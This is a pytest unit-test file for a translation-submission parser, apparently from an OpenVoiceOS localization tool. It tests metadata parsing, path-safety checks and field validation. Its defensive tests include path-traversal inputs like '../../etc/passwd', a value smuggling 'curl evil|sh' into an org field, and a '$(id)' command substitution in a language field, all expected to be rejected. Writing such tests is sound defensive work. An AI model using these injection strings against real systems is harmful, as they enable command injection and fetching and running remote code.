"""Unit tests for the translation submission payload contract (B3.1)."""

import base64
import json

import pytest

from ovos_localize.sync.submission import (
    Entry,
    SubmissionError,
    group_by_repo,
    is_safe_path,
    parse_issue_body,
    validate_entries,
)


def _v1_body(org="OpenVoiceOS", repo="skill-x", file_path="locale/de-DE/a.dialog"):
    content = base64.b64encode(b"hallo").decode()
    return (
        f"<!-- TRANSLATION_META\n"
        f"org: {org}\nrepo: {repo}\nbranch: dev\n"
        f"file_path: {file_path}\nlang: de-DE\nfile_key: a.dialog\n-->\n"
        f"<content>{content}</content>\n"
    )


def _v2_body(entries):
    payload = json.dumps({"meta_version": 2, "entries": entries})
    return f"intro text\n<!-- SESSION_META\n{payload}\n-->\ntail"


class TestParseV1:
    def test_single_entry(self):
        entries = parse_issue_body(_v1_body())
        assert len(entries) == 1
        e = entries[0]
        assert e.org == "OpenVoiceOS" and e.repo == "skill-x"
        assert e.file_path == "locale/de-DE/a.dialog"
        assert base64.b64decode(e.content_b64) == b"hallo"

    def test_missing_content_is_empty(self):
        """Parsing reports what the issue said; validation is what refuses it."""
        body = _v1_body().split("<content>")[0]  # drop the content block
        entry = parse_issue_body(body)[0]
        assert entry.content_b64 == ""
        with pytest.raises(SubmissionError):
            validate_entries([entry])


class TestParseV2:
    def test_multiple_entries(self):
        entries = parse_issue_body(_v2_body([
            {"org": "o", "repo": "r1", "file_path": "locale/de-DE/a.voc", "lang": "de-DE"},
            {"org": "o", "repo": "r2", "file_path": "locale/de-DE/b.intent", "lang": "de-DE"},
        ]))
        assert [e.repo for e in entries] == ["r1", "r2"]
        assert entries[0].branch == "dev"  # default applied

    def test_v2_takes_precedence_over_v1(self):
        # A body with both blocks parses as the richer v2.
        body = _v2_body([{"org": "o", "repo": "r", "file_path": "locale/de-DE/a.voc", "lang": "de-DE"}]) + _v1_body()
        assert len(parse_issue_body(body)) == 1
        assert parse_issue_body(body)[0].repo == "r"

    def test_bad_json_raises(self):
        with pytest.raises(SubmissionError):
            parse_issue_body("<!-- SESSION_META\n{not json}\n-->")

    def test_empty_entries_raises(self):
        with pytest.raises(SubmissionError):
            parse_issue_body(_v2_body([]))

    def test_missing_field_raises(self):
        with pytest.raises(SubmissionError):
            parse_issue_body(_v2_body([{"org": "o", "repo": "r"}]))  # no file_path/lang


class TestNoPayload:
    def test_raises(self):
        with pytest.raises(SubmissionError):
            parse_issue_body("just a normal issue, no meta")


class TestIsSafePath:
    @pytest.mark.parametrize("p", [
        "locale/de-DE/a.dialog", "res/en-us/x.voc", "locale/kab/a.intent",
        "skill/locale/pt-PT/settingsmeta.json",
    ])
    def test_safe(self, p):
        assert is_safe_path(p) is True

    @pytest.mark.parametrize("p", [
        "/etc/passwd",                       # absolute
        "../../etc/passwd",                  # traversal
        "locale/../../../secret.dialog",     # traversal mid-path
        "locale/de-DE/a.py",                 # disallowed suffix
        "locale/de-DE/",                     # no file / bad suffix
        "",                                  # empty
        "locale\\de-DE\\a.dialog",           # backslash
        "locale/de-DE/a.dialog/..",          # trailing traversal
    ])
    def test_unsafe(self, p):
        assert is_safe_path(p) is False


class TestValidateEntries:
    def test_rejects_unsafe_path(self):
        entries = [Entry("o", "r", "dev", "../evil.dialog", "de-DE", "k")]
        with pytest.raises(SubmissionError):
            validate_entries(entries)

    def test_rejects_missing_org(self):
        entries = [Entry("", "r", "dev", "locale/de-DE/a.voc", "de-DE", "k")]
        with pytest.raises(SubmissionError):
            validate_entries(entries)

    def test_passes_valid(self):
        entries = [Entry("o", "r", "dev", "locale/de-DE/a.voc", "de-DE", "k", "eA==")]
        assert validate_entries(entries) == entries


class TestGroupByRepo:
    def test_groups_per_repo(self):
        entries = [
            Entry("o", "r1", "dev", "locale/de-DE/a.voc", "de-DE", "a"),
            Entry("o", "r2", "dev", "locale/de-DE/b.voc", "de-DE", "b"),
            Entry("o", "r1", "dev", "locale/de-DE/c.voc", "de-DE", "c"),
        ]
        grouped = group_by_repo(entries)
        assert set(grouped) == {("o", "r1"), ("o", "r2")}
        assert len(grouped[("o", "r1")]) == 2


class TestPathAnchoring:
    """Rejecting traversal is not enough on its own.

    A repository-root file contains no ``..`` and can end in an allowed
    suffix, so the path has to be anchored to a locale directory as well.
    """

    @pytest.mark.parametrize("path", [
        "package.json",
        "renovate.json",
        ".github/workflows/evil.json",
        ".github/workflows/locale/en-US/evil.json",
        "locale/a.dialog",
        "locale/kab/a.sh",
    ])
    def test_rejected(self, path):
        assert not is_safe_path(path)

    @pytest.mark.parametrize("path", [
        "locale/kab/a.dialog",
        "skill_x/locale/pt-PT/a.intent",
        "ovos_core/intent_services/locale/en-US/stop.voc",
        "locale/ca-ES/dialog/date-time/early morning.dialog",
        "ovos_color_parser/res/kab/colors.json",
    ])
    def test_accepted(self, path):
        assert is_safe_path(path)


class TestEntryFieldValidation:
    @staticmethod
    def _entry(**kw):
        return Entry(
            kw.get("org", "o"), kw.get("repo", "r"), "dev",
            kw.get("path", "locale/kab/a.dialog"), kw.get("lang", "kab"),
            "a.dialog", kw.get("content", "eA=="),
        )

    def test_org_with_shell_metacharacters_is_refused(self):
        with pytest.raises(SubmissionError):
            validate_entries([self._entry(org='o"; curl evil|sh; #')])

    def test_language_must_be_a_language_tag(self):
        with pytest.raises(SubmissionError):
            validate_entries([self._entry(lang="de$(id)")])

    def test_a_session_cannot_open_unbounded_pull_requests(self):
        with pytest.raises(SubmissionError):
            validate_entries([self._entry() for _ in range(500)])
